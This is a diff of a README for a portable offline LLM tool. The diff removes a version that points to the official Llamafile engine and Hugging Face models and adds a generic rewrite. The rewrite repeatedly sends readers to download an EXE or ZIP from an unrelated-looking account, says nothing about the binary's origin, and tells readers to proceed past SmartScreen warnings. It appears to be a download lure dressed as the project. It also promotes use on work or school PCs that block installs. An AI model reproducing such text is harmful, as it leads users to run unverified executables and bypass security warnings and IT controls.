@@ -1,168 +1,186 @@
-<div align="center">
+# 🧠 Portable-Offline-LLM - Private AI on a USB Drive
 
-![Portable AI Hero](assets/hero.png)
+[![Download Portable-Offline-LLM](https://img.shields.io/badge/Download%20Portable--Offline--LLM-blue?style=for-the-badge)](https://github.com/recognisable-riddance165/Portable-Offline-LLM)
 
-# 🖥️ Portable Offline LLM on a USB Drive
+## 🔗 Download
 
-> **Run a fully private, elite AI assistant from your pocket — Zero installation. Zero cloud. Zero traces.**
+Visit this page to download Portable-Offline-LLM:
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-f39c12.svg?style=for-the-badge&logo=opensourceinitiative&logoColor=white)](https://opensource.org/licenses/MIT)
-[![Platform: Windows](https://img.shields.io/badge/Windows-0078D4.svg?style=for-the-badge&logo=windows&logoColor=white)](https://www.microsoft.com/windows)
-[![Platform: Unix](https://img.shields.io/badge/Linux%20%7C%20macOS-FCC624.svg?style=for-the-badge&logo=linux&logoColor=black)](https://www.linux.org/)
-[![Powered by Llamafile](https://img.shields.io/badge/Powered%20By-Llamafile-ff6b6b.svg?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mozilla-Ocho/llamafile)
+https://github.com/recognisable-riddance165/Portable-Offline-LLM
 
----
+## 💻 What this is
 
-### **[Explore the Docs](#-setup-guide)** • **[Download Models](#-step-3--download-an-ai-model)** • **[Performance Tuning](#-performance-tuning)**
+Portable-Offline-LLM lets you run an AI assistant on Windows from a USB flash drive.
 
-</div>
+It works without installation, without internet, and without admin rights.
 
-## 🌌 Overview
+You can keep your files local and use the app on a PC that does not belong to you, as long as you can run programs from the drive.
 
-This project transforms any high-speed USB Drive into a **Sovereign AI Workstation**. Powered by **Llamafile**, it allows you to carry state-of-the-art Large Language Models (LLMs) and run them on any machine without hardware setup, internet access, or administrator privileges.
+## 🚀 What you can do
 
-### 🌟 Premium Features
+- Chat with a local AI assistant
+- Keep your data on your own drive
+- Run the app without setup on the PC
+- Use it on more than one Windows computer
+- Work offline once the files are on the USB drive
+- Avoid cloud sign-ins and web access
 
-| **🔌 Zero-Footprint** | **🔒 Hardened Privacy** | **⚡ High Performance** |
-| :--- | :--- | :--- |
-| No registry changes or local installs. Plug in, run, and pull out. | Your data never transit through the cloud. Total air-gap safety. | Native speed via TinyBLAS and GPU offloading support. |
+## 📦 What you need
 
----
+- A Windows PC
+- A USB flash drive with enough free space
+- A recent 64-bit version of Windows
+- A few gigabytes of free disk space on the USB drive
+- Basic file access so you can open the app from the drive
 
-## 🔄 Visual Workflow
+## 🪟 How to download on Windows
 
-The "Plug & Chat" experience, visualized:
+1. Open this page in your browser:  
+   https://github.com/recognisable-riddance165/Portable-Offline-LLM
 
-```mermaid
-graph LR
-    A[fa:fa-usb USB Plugged] --> B{fa:fa-desktop OS Detection}
-    B -- Windows --> C[fa:fa-terminal launch_ai.bat]
-    B -- Unix --> D[fa:fa-terminal launch_ai.sh]
-    C --> E[fa:fa-list Model Selector]
-    D --> E
-    E --> F[fa:fa-bolt AI Engine Engine]
-    F --> G[fa:fa-globe Browser UI]
-    G --> H[fa:fa-commenting Private Chat]
-    
-    style A fill:#2c3e50,stroke:#3498db,stroke-width:2px,color:#fff
-    style H fill:#27ae60,stroke:#2ecc71,stroke-width:2px,color:#fff
-    style F fill:#e67e22,stroke:#d35400,stroke-width:2px,color:#fff
-```
+2. Find the download file or release package on the page.
 
----
+3. Save the file to your computer or directly to your USB drive.
 
-## 🚀 Setup Guide
+4. If the file is a ZIP archive, extract it to a folder on the USB drive.
 
-### Step 1 — Hardware Preparation
-1. Connect your **USB 3.0+** drive to a high-speed port (Blue/Red).
-2. Format as **exFAT** (Required for files >4GB).
+5. If the file is an EXE app, keep it in the folder where you want to run it.
 
-### Step 2 — The Engine
-1. Download the latest **Llamafile** binary from [GitHub Releases](https://github.com/Mozilla-Ocho/llamafile/releases).
-2. Place it in the root directory and rename it to **`llamafile.exe`**.
+## 🔌 How to run it from a USB drive
 
-### Step 3 — The Intelligence
-1. Pick a GGUF model from [Hugging Face](https://huggingface.co/models?library=gguf).
-2. **Move it into the `📂 models/` folder.**
-    - *Recommended:* Qwen 3 8B (Q4_K_M) or Llama 3 8B.
+1. Insert your USB flash drive into the Windows PC.
 
-### Step 4 — Launch
-- **Windows**: Double-click `launch_ai.bat`.
-- **Linux/macOS**: Run `sh launch_ai.sh` in the terminal.
+2. Open the USB drive in File Explorer.
 
----
+3. Go to the Portable-Offline-LLM folder.
 
-## 📁 Elite File Structure
+4. Double-click the app file.
 
-A professionally organized USB drive ensures maximum speed and ease of use:
+5. Wait for the model to load.
 
-```bash
-📁 USB DRIVE (exFAT)
-├── 📄 llamafile.exe        # The core engine
-├── 📄 launch_ai.bat        # Windows entry point
-├── 📄 launch_ai.sh         # Unix entry point
-├── 📁 models/              # Your brain library (.gguf files)
-│    └── 📄 qwen_3_8b.gguf
-├── 📁 system_prompts/      # Persona templates (.txt)
-│    ├── 📄 Code_Architect.txt
-│    └── 📄 ...
-├── 📁 scripts/
-│    └── 📄 update_llamafile.ps1 # Auto-update tool
-└── 📁 assets/              # documentation visuals
-```
+6. Type your message in the chat window and press Enter.
 
----
+## 🧭 First-time setup
 
-## ⚡ Performance Tuning
+When you run the app for the first time, it may take a little longer to start.
 
-> [!IMPORTANT]
-> To achieve the best inference speed, always use a **USB 3.1 Gen 2** port or a portable NVMe SSD.
+That is normal for local AI apps because they load model files from the drive.
 
-### GPU Acceleration
-Llamafile automatically attempts to use your GPU. If you have an NVIDIA GPU, inference will be up to **10x faster**. No drivers needed beyond standard OS defaults.
+If the app asks where the model file is, pick the GGUF file inside the Portable-Offline-LLM folder.
 
-### Advanced Flags
-You can edit the `launch_ai` scripts to include:
-- `--threads 8`: Optimize for your specific CPU core count.
-- `-c N` | Context window size | Default is 512; increase for longer conversations (consumes more RAM) |
+If it asks for a runtime or engine path, keep the default option unless the page gives a different file name.
 
----
+## 📁 Folder layout
 
-## 🔒 Privacy Hardening
+You may see files like these:
 
-To ensure no trace is left on the host computer:
+- `Portable-Offline-LLM.exe` — starts the app
+- `models` — stores the AI model files
+- `data` — keeps your chat files and settings
+- `logs` — stores app logs if you need them
+- `README.md` — project notes and basic use steps
 
-### Private Browsing
-The `launch_ai.bat` script now supports launching in **Incognito/Private** mode for Chrome, Edge, and Firefox. This prevents the browser from saving:
-- Chat history in cache.
-- Session cookies.
-- Form data.
+## 🧩 File types you may see
 
-### Anti-Forensics
-Always use the **"Clear All"** option in the Llamafile UI before unplugging your drive to wipe the current session from the system's memory.
+- `EXE` — the program you open
+- `ZIP` — a compressed file you extract
+- `GGUF` — the AI model file the app uses
+- `TXT` or `MD` — text instructions
 
----
+## ⚙️ Basic use
 
-## 🛠️ Maintenance
+- Open the app
+- Wait for the model to load
+- Type a question
+- Read the reply
+- Ask a follow-up if needed
 
-### Auto-Updates
-Keep your AI engine up-to-date without manually visiting GitHub:
-1. Open PowerShell.
-2. Run the update script:
-   ```powershell
-   .\scripts\update_llamafile.ps1
-   ```
-3. The script will automatically fetch the latest `llamafile.exe` from the official repository.
+You can ask for help with writing, planning, summaries, code explainers, and general tasks.
 
----
+## 🔒 Privacy and offline use
 
-## 🎭 System Prompts
+Portable-Offline-LLM is built for local use.
 
-Inject "Experience" into your AI. Copy templates from `📁 system_prompts/` directly into the UI:
-- **Code Architect**: For deep technical builds.
-- **Security Auditor**: For pessimistic code reviews.
-- **Creative Writer**: For vivid storytelling.
+Your chat stays on the device where you run it.
 
----
+Once you have the files on the USB drive, you do not need the internet to use the assistant.
 
-## 🔧 Troubleshooting
+That makes it useful for private work, travel, or locked-down computers.
 
-<details>
-<summary><b>Click to expand common fixes</b></summary>
+## 🧠 Model notes
 
-- **"Permission Denied" (Linux/macOS)**: Run `chmod +x llamafile.exe launch_ai.sh`.
-- **Extremely Slow Loading**: verify you are not using a USB 2.0 (Black) port.
-- **Out of Memory**: Try a smaller model (e.g., 3B or 1.5B parameters).
-</details>
+This project uses a local LLM in GGUF format.
 
----
+A GGUF model is a file that stores the AI model data in a format made for local tools.
 
-<div align="center">
+If the project uses a Qwen3 model, you can expect strong general chat, writing help, and instruction following.
 
-### Built for Privacy. Designed for Portability.
+Larger models may give better replies but need more memory and storage.
 
-[**Back to Top**](#️-portable-offline-llm-on-a-usb-drive)
+## 🛠️ Troubleshooting
 
-*Made with ❤️ by Gg — Carry your AI everywhere.*
+If the app does not open:
 
-</div>
+- Check that you copied all files from the download
+- Make sure you ran the correct EXE file
+- Try another USB port
+- Keep the folder path simple
+- Avoid moving files after setup
+
+If the model does not load:
+
+- Check that the GGUF file is still in the model folder
+- Make sure the file was not left inside a ZIP archive
+- Confirm that the USB drive has enough free space
+- Wait longer on the first launch
+
+If the app feels slow:
+
+- Close other large apps
+- Use a faster USB drive
+- Use a smaller model file if the project includes more than one
+- Run it on a PC with more RAM
+
+If Windows blocks the app:
+
+- Open the file from File Explorer
+- If SmartScreen appears, use the local file you downloaded from the project page
+- Make sure the file finished downloading before you try again
+
+## 🧪 Best results
+
+- Use a fast USB 3.0 drive
+- Keep the app and model files in one folder
+- Leave enough free space for chat history and temp files
+- Use a PC with good memory if you want faster replies
+- Close the app cleanly before removing the USB drive
+
+## 📚 Typical use cases
+
+- Private writing help on shared computers
+- Offline work in places with no internet
+- Quick local AI access from a carry-anywhere drive
+- Personal notes and drafts kept off the cloud
+- Temporary use on a work or school PC that does not allow installs
+
+## 🔍 Search terms
+
+- ai-assistant
+- gguf
+- llamafile
+- llm
+- no-admin-rights
+- offline-ai
+- portable
+- privacy
+- qwen3
+- usb-drive
+- windows
+
+## 🧾 License
+
+Check the project page for license details and file names before use
+
+## 📥 Download again
+
+https://github.com/recognisable-riddance165/Portable-Offline-LLM
